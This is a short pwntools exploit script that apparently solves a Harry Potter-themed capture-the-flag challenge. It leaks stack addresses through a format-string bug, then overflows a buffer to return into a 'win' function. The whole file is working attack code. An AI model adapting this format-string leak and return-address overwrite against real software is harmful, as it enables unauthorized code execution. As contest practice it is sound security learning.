from pwn import *

p = remote("hax1.allesctf.net",9100) # connect to the challenge sever

p.sendline("|".join(["%p"]*70)) # Format string exploit

p.readline() # reading the Hufflepuff banner
p.readline()
p.readline()
p.readline()

leaks = p.readline().decode("utf-8").split("|") # read the leaked values

leak_addr = int(leaks[38],16) # get the leaked return address

ret = leak_addr - 0x2e # calculate the address of an ret instruction

win = leak_addr - 0x135 # calculate the address of WINgardium_leviosa

p.sendline(b"Expelliarmus\0" + b"A" * cyclic_find(b"cnaa") + p64(ret) + p64(win))

p.interactive()
